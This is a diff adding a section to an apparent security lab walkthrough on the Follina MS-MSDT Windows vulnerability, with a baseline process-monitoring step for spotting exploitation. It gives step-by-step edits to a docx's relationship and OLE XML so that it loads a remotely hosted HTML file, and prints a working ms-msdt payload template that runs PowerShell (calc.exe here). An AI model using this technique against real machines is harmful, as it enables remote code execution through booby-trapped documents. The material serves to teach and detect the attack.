@@ -66,9 +66,49 @@ Think of it like this - you’re having car problems and you don’t know about 
 
 ---
 
-### 
+### Exploiting the Follina Windows Vulnerability
 
+Before we do any exploitation in the machine, let’s first try and make sense of the baseline processes of the machine. It is in having a sense of normalcy that we’d be able to spot minute changes later on that may consequently reveal malicious activity by a threat actor in our environment.
 
+The process explorer from sysinternals has already been downloaded and pinned in the taskbar for easier access. Proceed to open it and scan through the processes currently running in the machine. Keep it open as we go through the activities later on so you'd be able to immediately see how an exploited follina-msdt vulnerability would look like as compared to the "baseline" - the processes that we're seeing while the machine is immaculate.
+
+### Exploit Explanation
+
+Let’s start with a disclaimer: for our purposes, we’ll be loading our payload via a word document, particularly in the .docx format - this is the original exploit that has been discovered in the wild. However, this vulnerability has been proved to work in a number of other office products, and the student is obliged to maximize learning by trying them out separately.
+
+Two important aspects of this vulnerability are: 1) specific docx files contain OLE (originally abbreviates to Object Linking and Embedding) Object references, and sometimes, they take the form of HTML files hosted elsewhere, and 2) MS-MSDT allows for code execution.
+
+Combining the above two aspects together, an MS-MSDT HTML scheme can be used to execute PowerShell code, and that a docx file can be used to load it via word’s external reference capability.
+
+More specifically, drilling into the docx structure, the word/_rels/document.xml.rels file has an XML tag `<Relationship>` with an attribute `Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"` that describes an external oleObject reference. In order to exploit this docx feature, we can edit the contents of this tag to point instead to the payload that we're hosting by changing the `Target` value into http://<external_payload_server.com>/<payload.html> and the `TargetMode` value into "External".
+
+In the word/document.xml file, there's an XML tag that starts with `<o:OLEObject...>` wherein we should change the Type value to `"Link"` and then add the Key-Value pair attribute `UpdateMode="OnCall"`.
+
+The only thing left to do now is to host the payload that the word file will be connecting to, and receiving instructions from upon opening of the file. This is done by creating an html file with a structure similar to this:
+
+```html
+<!doctype html>
+
+<html lang="en">
+
+<body>
+
+<script>
+
+//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA should be repeated >60 times
+
+  window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=h$(IEX('calc.exe'))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe \"";
+
+</script>
+
+</body>
+
+</html>
+```
+
+In the above contents of the html file, you'd notice the `ms-msdt:/id PCWDiagnostic /skip force /param` command, along with the command switches you can use to set the command you want to execute in the target machine. You can then mix and match the payload according to your purposes.
+
+As such, we now have a way to achieve remote code execution without touching any macros, and as we'll see later, without even opening the malicious document.
 
 ---
 
